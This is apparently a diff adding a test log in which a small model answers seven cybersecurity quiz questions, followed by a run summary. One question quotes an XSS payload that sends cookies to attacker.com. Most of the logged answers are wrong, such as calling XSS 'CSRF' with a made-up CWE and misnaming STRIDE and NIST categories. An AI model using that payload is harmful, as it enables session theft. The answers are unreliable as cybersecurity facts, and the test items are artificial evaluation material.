@@ -1,0 +1,145 @@
+Cybersecurity Sanity Test Log
+Run Mode: qwen2_5_0_5b
+Initialized: 2025-07-14T14:52:18.152683
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T14:52:23.109937
+Model: qwen2.5:0.5b
+Category: Basic Definitions - Identification
+Response Time: 4.95 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+Analyze the following statement: 'The system must enforce multi-factor authentication (MFA) for all administrative access.' In the context of cybersecurity, what type of statement is this and what is its primary purpose?
+
+LLM RESPONSE:
+This is an informational statement about a specific technology or practice in cybersecurity. It aims to explain that MFA is essential for protecting user accounts against unauthorized access. The primary purpose is to inform users about implementing this authentication method as part of their daily security practices.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T14:52:27.448275
+Model: qwen2.5:0.5b
+Category: Frameworks - Application
+Response Time: 4.34 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A company experiences a ransomware attack. They activate their incident response plan to contain the damage and begin restoring systems from backups. According to the NIST Cybersecurity Framework (CSF), which two core functions are most prominently demonstrated by these actions?
+
+LLM RESPONSE:
+The two core functions that are most prominently demonstrated by these actions according to the National Institute of Standards and Technology's Cyber Security Framework (NIST Cybersecurity Framework) are:
+
+1. Incident Response: The company is actively managing the event, mitigating impact, restoring systems, recovering from damage, and addressing lessons learned.
+
+2. Information Protection: They are taking immediate steps to contain the attack, secure their data, and prevent further spread of information through backups and incident response protocols.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T14:52:32.688992
+Model: qwen2.5:0.5b
+Category: Security Controls - Identification
+Response Time: 5.24 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A security policy mandates that 'all actions performed by privileged users, including logins and system changes, must be recorded in immutable, time-stamped log files.' Within the NIST SP 800-53 standard, which control family specifically addresses this type of requirement?
+
+LLM RESPONSE:
+The control family that specifically addresses this requirement is **Control Family A**: Access Controls. This family focuses on securing access to systems and data based on user identities. It ensures that actions performed by privileged users are logged in immutable and time-stamped.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T14:52:37.887681
+Model: qwen2.5:0.5b
+Category: Vulnerabilities - Identification
+Response Time: 5.19 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A web application has a comments section where user input is directly rendered back to the page without being sanitized. An attacker posts a comment containing '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'. What is the common name for this vulnerability and what is its corresponding CWE identifier?
+
+LLM RESPONSE:
+The common name for this vulnerability is CSRF (Cross-Site Request Forgery). Its corresponding CWE (Common Exposure) identifier is E-48.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T14:52:41.772605
+Model: qwen2.5:0.5b
+Category: Threat Modeling - Classification
+Response Time: 3.88 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+During a threat modeling exercise, a team identifies a risk where an unauthorized user could intercept and alter data packets being sent between a client and a server, changing the amount of a financial transaction. Within the STRIDE threat model, which category does this threat belong to?
+
+LLM RESPONSE:
+According to the STRIDE classification, this would fall under **Stolen Data (D)**.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T14:52:47.384953
+Model: qwen2.5:0.5b
+Category: Regulations/Directives - Application
+Response Time: 5.61 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+Consider two security incidents in the EU: 1) A nationwide power grid operator suffers a cyberattack that disrupts electricity distribution. 2) A social media company has a data breach exposing the personal messages of millions of users. Which regulation is the primary concern for incident 1, and which for incident 2?
+
+LLM RESPONSE:
+Incident 1 primarily concerns the national security implications related to the power grid operator's cyberattack, while Incident 2 concerns the potential privacy and data exposure issues posed by social media breaches.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T14:52:54.393536
+Model: qwen2.5:0.5b
+Category: Basic Principles - Application
+Response Time: 7.00 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A cloud storage service uses data checksums (like SHA-256 hashes) to verify that files have not been altered or corrupted during upload or download. Which principle of the CIA triad is primarily being upheld by this security control?
+
+LLM RESPONSE:
+The principle of the CIA triad, which stands for Confidentiality, Integrity, and Availability, is primarily being upheld by the cloud storage service's use of data checksums (SHA-256 hashes) to ensure that files have not been altered or corrupted during upload or download. This method protects information from unauthorized access, ensuring that only authorized users can view and modify the files.
+
+--- End of Test Case ---
+==================================================
+
+--- Run Summary ---
+
+Model: qwen2.5:0.5b
+  - Total Tests: 7
+  - Total Time Spent in LLM Calls: 36.20 seconds
+  - Average Response Time: 5.17 seconds
+
+Total Number of Test Cases Configured: 7
+
+End of Log.
